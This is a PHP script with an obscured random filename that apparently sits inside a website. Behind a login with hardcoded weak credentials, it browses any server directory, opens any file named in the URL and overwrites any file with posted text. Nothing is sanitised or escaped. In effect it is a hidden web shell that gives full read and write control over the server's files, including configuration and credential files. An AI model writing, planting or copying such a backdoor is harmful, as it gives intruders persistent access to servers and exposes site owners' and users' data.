<?php
header ('Content-Type: text/html; charset=utf-8');
include '../init.lib.php';
connect_to_mysql();
if(!isset($_SESSION)){ 
 //session_sart(); 
} 

$my_name = "sfdghhlfhdgkfdjhgkld.php";
$login = "folder";
$pass = "123456";
$session_code = 'sa;oitfh;lk(*&%y3-09420934-234023hgf4rtwer';

if(isset($_POST['login']) AND $_POST['login'] != ""){
  if($_POST['login'] == $login AND $_POST['pass'] == $pass){
      $_SESSION[$session_code] = "+";
  }
  
}

if (!isset($_SESSION[$session_code])){
    echo "<form enctype='multipart/form-data' method='post'>
	  <br><input type=\"text\" name=\"login\">
	  <br><input type=\"password\" name=\"pass\">
	  <br><input type=\"submit\" name=\"set\">
	  </form>";
    exit();
}


$patch = "/var/www/";
if(isset($_GET['patch'])){
  if($_GET['patch'] != "home")  $patch = $_GET['patch'];
}
    if ($handle = opendir($patch)) {
    $files = array();
    $files['.'] = "<a href=\"{$my_name}?patch=home\">[HOME]</a><br>";
   
    while (false !== ($file = readdir($handle))) { 
 	if($file != ".") $files[$file] = "<a href=\"{$my_name}?file={$patch}{$file}&patch={$patch}\">$file</a> <a href=\"{$my_name}?patch={$patch}{$file}/\">[->]</a><br>";
    }
    closedir($handle); 
    }

    sort($files);
    
    echo "<div style=\"float:left;\">";
    foreach($files as $file){
      echo $file;
    }
    echo "</div>";

if(isset($_POST['save'])){
    $filename = $_POST['filename'];
    $contents = $_POST['text'];
    file_put_contents($filename, $contents);
    echo "<b>Сохранили</b>";
}

if(isset($_GET['file'])){
  $temp_header = $_GET['file'];
  $text = file_get_contents($temp_header); 
  
    echo "<div style=\"float:left;\">
	  <form enctype='multipart/form-data' method='post'>
	  <input type=\"submit\" name=\"save\" >
	  <input type=\"text\" name=\"filename\" value=\"$temp_header\" style=\"width:500px\">
	  <br>
	  <textarea cols=\"200\" rows=\"500\" name=\"text\">$text</textarea>
	  
	  </form>
	  </div>";
}
    
?>
